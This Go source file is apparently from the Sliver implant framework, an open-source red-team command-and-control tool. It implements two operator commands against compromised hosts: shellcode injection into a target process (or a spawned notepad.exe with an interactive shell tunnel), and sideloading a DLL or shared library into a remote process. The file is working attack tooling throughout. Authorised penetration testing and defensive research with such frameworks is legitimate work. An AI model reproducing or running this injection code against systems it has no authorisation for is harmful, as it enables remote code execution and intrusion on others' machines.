package sliver

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path"
	"strings"

	"golang.org/x/crypto/ssh/terminal"

	"github.com/bishopfox/sliver/client/constants"
	cctx "github.com/bishopfox/sliver/client/context"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/spin"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/client/util"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ExecuteShellcode - Executes the given shellcode in the sliver process
type ExecuteShellcode struct {
	Positional struct {
		LocalPath string `description:"path to shellcode to inject" required:"1-1"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		RWX         bool   `long:"rwx" short:"r" description:"use RWX permissions for memory pages"`
		PID         uint32 `long:"pid" short:"p" description:"PID of process to inject into (0 means injection into ourselves)"`
		RemotePath  string `long:"process" short:"n" description:"path to process to inject into when running in interactive mode" default:"c:\\windows\\system32\\notepad.exe"`
		Interactive bool   `long:"interactive" short:"i" description:"inject into a new process and interact with it"`
	} `group:"shellcode options"`
}

// Execute - Executes the given shellcode in the sliver process
func (es *ExecuteShellcode) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	interactive := es.Options.Interactive
	pid := es.Options.PID
	shellcodePath := es.Positional.LocalPath
	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		fmt.Printf(util.Error+"Error: %s\n", err.Error())
		return
	}
	if pid != 0 && interactive {
		fmt.Printf(util.Error + "Cannot use both `--pid` and `--interactive`\n")
		return
	}
	if interactive {
		es.executeInteractive(es.Options.RemotePath, shellcodeBin, es.Options.RWX)
		return
	}
	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	go spin.Until(msg, ctrl)
	task, err := transport.RPC.Task(context.Background(), &sliverpb.TaskReq{
		Data:     shellcodeBin,
		RWXPages: es.Options.RWX,
		Pid:      uint32(pid),
		Request:  cctx.Request(session),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}
	if task.Response.GetErr() != "" {
		fmt.Printf(util.Error+"Error: %s\n", task.Response.GetErr())
		return
	}
	fmt.Printf(util.Info + "Executed shellcode on target\n")

	return
}

func (es *ExecuteShellcode) executeInteractive(hostProc string, shellcode []byte, rwxPages bool) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	// Use the client logger for controlling log output
	clog := log.ClientLogger

	// Start remote process and tunnel
	noPty := false
	if session.GetOS() == "windows" {
		noPty = true // Windows of course doesn't have PTYs
	}

	rpcTunnel, err := transport.RPC.CreateTunnel(context.Background(), &sliverpb.Tunnel{
		SessionID: session.ID,
	})

	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}

	tunnel := transport.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())

	shell, err := transport.RPC.Shell(context.Background(), &sliverpb.ShellReq{
		Path:      hostProc,
		EnablePTY: !noPty,
		TunnelID:  tunnel.ID,
		Request:   cctx.Request(session),
	})

	if err != nil {
		fmt.Printf(util.Error+"Error: %v\n", err)
		return
	}
	// Retrieve PID and start remote task
	pid := shell.GetPid()

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
	go spin.Until(msg, ctrl)
	_, err = transport.RPC.Task(context.Background(), &sliverpb.TaskReq{
		Pid:      pid,
		Data:     shellcode,
		RWXPages: rwxPages,
		Request:  cctx.Request(session),
	})
	ctrl <- true
	<-ctrl

	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}

	clog.Debugf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
	fmt.Printf(util.Info+"Started remote shell with pid %d\n\n", shell.Pid)

	var oldState *terminal.State
	if !noPty {
		oldState, err = terminal.MakeRaw(0)
		clog.Tracef("Saving terminal state: %v", oldState)
		if err != nil {
			fmt.Printf(util.Error + "Failed to save terminal state")
			return
		}
	}

	clog.Debugf("Starting stdin/stdout shell ...")
	go func() {
		n, err := io.Copy(os.Stdout, tunnel)
		clog.Tracef("Wrote %d bytes to stdout", n)
		if err != nil {
			fmt.Printf(util.Error+"Error writing to stdout: %v", err)
			return
		}
	}()
	for {
		clog.Debugf("Reading from stdin ...")
		n, err := io.Copy(tunnel, os.Stdin)
		clog.Tracef("Read %d bytes from stdin", n)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Printf(util.Error+"Error reading from stdin: %v", err)
			break
		}
	}

	if !noPty {
		clog.Debugf("Restoring terminal state ...")
		terminal.Restore(0, oldState)
	}

	clog.Debugf("Exit interactive")
	bufio.NewWriter(os.Stdout).Flush()

}

// Sideload - Load and execute a shared object (shared library/DLL) in a remote process
type Sideload struct {
	Positional struct {
		LocalPath string   `description:"path to shared object" required:"1-1"`
		Args      []string `description:"(optional) arguments for the shared library function"`
	} `positional-args:"yes" required:"yes"`

	Options struct {
		Entrypoint string `long:"entry-point" short:"e" description:"entrypoint for the DLL (Windows only)"`
		RemotePath string `long:"process" short:"p" description:"path to process to host the shellcode"`
		Save       bool   `long:"save" short:"s" description:"save output to file"`
		KeepAlive  bool   `long:"keep-alive" short:"k" description:"don't terminate host process once the execution completes"`
	} `group:"sideload options"`
}

// Execute - Load and execute a shared object (shared library/DLL) in a remote process
func (s *Sideload) Execute(args []string) (err error) {
	session := cctx.Context.Sliver.Session
	if session == nil {
		return
	}

	binPath := s.Positional.LocalPath

	entryPoint := s.Options.Entrypoint
	processName := s.Options.RemotePath
	cargs := strings.Join(s.Positional.Args, " ")

	binData, err := ioutil.ReadFile(binPath)
	if err != nil {
		fmt.Printf(util.Error+"%s", err.Error())
		return
	}
	ctrl := make(chan bool)
	go spin.Until(fmt.Sprintf("Sideloading %s ...", binPath), ctrl)
	sideload, err := transport.RPC.Sideload(context.Background(), &sliverpb.SideloadReq{
		Args:        cargs,
		Data:        binData,
		EntryPoint:  entryPoint,
		ProcessName: processName,
		Kill:        !s.Options.KeepAlive,
		Request:     cctx.Request(session),
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		fmt.Printf(util.Error+"Error: %v", err)
		return
	}

	if sideload.GetResponse().GetErr() != "" {
		fmt.Printf(util.Error+"Error: %s\n", sideload.GetResponse().GetErr())
		return
	}
	var outFilePath *os.File
	if s.Options.Save {
		outFile := path.Base(fmt.Sprintf("%s_%s*.log", constants.SideloadStr, session.GetHostname()))
		outFilePath, err = ioutil.TempFile("", outFile)
	}
	fmt.Printf(util.Info+"Output:\n%s", sideload.GetResult())
	if outFilePath != nil {
		outFilePath.Write([]byte(sideload.GetResult()))
		fmt.Printf(util.Info+"Output saved to %s\n", outFilePath.Name())
	}

	return
}
